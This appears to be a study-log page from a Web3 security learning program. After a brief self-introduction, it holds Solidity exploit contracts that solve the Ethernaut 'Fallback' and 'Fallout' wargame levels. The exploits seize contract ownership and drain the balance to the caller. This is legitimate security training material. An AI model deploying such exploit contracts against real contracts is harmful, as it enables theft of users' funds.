---
timezone: Asia/Shanghai
---


# {Elvin}

1. 自我介绍
Hello, I am Elvin, majored in Computer Science. Security is the foundation of the next-generation financial network. I am really pleased to join with all of you for this valuable learning experience. Hope we could make the progress together for this program and the future challenges. :-)

2. 你认为你会完成本次残酷学习吗？
Definitely Yes.


## Notes

<!-- Content_START -->

### 2024.08.29

1. Ethernaut - Fallback
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external payable;
    function getContribution() external view returns (uint256);
    function withdraw() external;
    function owner() external view returns (address);
}

contract FallbackExploit {
    IFallback public target;

    constructor(address _targetAddress) {
        target = IFallback(_targetAddress);
    }

    function exploit() external payable {
        // Step 1: Contribute a small amount
        target.contribute{value: 0.0005 ether}();

        // Step 2: Trigger receive() function to become the owner
        (bool success,) = address(target).call{value: 0.0005 ether}("");
        require(success, "Failed to send Ether");

        // Confirm that we are now the owner
        require(target.owner() == address(this), "Failed to become owner");

        // Step 3: Withdraw all funds
        uint256 initialBalance = address(target).balance;
        target.withdraw();

        // Confirm that all funds have been withdrawn
        require(address(target).balance == 0, "Failed to withdraw all funds");

        // Confirm that we received the funds
        require(address(this).balance >= initialBalance, "Failed to receive funds");

        // Send the stolen funds to the caller of this function
        payable(msg.sender).transfer(address(this).balance);
    }

    // Allow the contract to receive Ether
    receive() external payable {}
}
```

2. Ethernaut - Fallout
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address payable);
}

contract FalloutExploit {
    IFallout public target;

    constructor(address _targetAddress) {
        target = IFallout(_targetAddress);
    }

    function exploit() external {
        // Call the Fal1out function to become owner
        target.Fal1out();

        // Check if the exploit was successful
        require(target.owner() == address(this), "Exploit failed: ownership not transferred");
    }
}
```

### 2024.08.30



<!-- Content_END -->
